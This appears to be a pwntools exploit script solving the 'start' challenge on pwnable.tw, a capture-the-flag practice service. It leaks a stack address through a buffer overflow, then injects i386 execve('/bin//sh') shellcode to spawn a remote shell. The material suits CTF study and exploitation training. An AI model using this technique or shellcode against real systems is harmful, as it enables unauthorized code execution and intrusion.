import pwn 
from pwn import *
context.arch = "i386"
#p = process("./start")
p = remote('chall.pwnable.tw', 10000)
offset = b"A"*20
gadget = p32(0x08048087)
stage1 = offset + gadget 
p.recvuntil(b"CTF:")
p.send(stage1)
leak = u32(p.recv()[:4])

shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
#print(len(shellcode))
stage2 = b"A"*20 
stage2 += p32(leak+20)
stage2 += shellcode
p.send(stage2)
p.interactive()
